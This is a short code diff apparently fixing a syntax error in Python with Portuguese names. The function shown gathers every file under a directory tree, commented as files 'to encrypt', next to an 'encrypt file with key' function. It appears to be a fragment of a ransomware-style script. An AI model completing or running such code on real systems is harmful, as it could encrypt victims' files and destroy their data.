@@ -22,7 +22,7 @@ def criptografar_arquivo(arquivo, chave):
 
 #4. Encontrar arquivos para criptografar
 def encontrar_arquivos(diretorio):
-    lista[]
+    lista = []
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
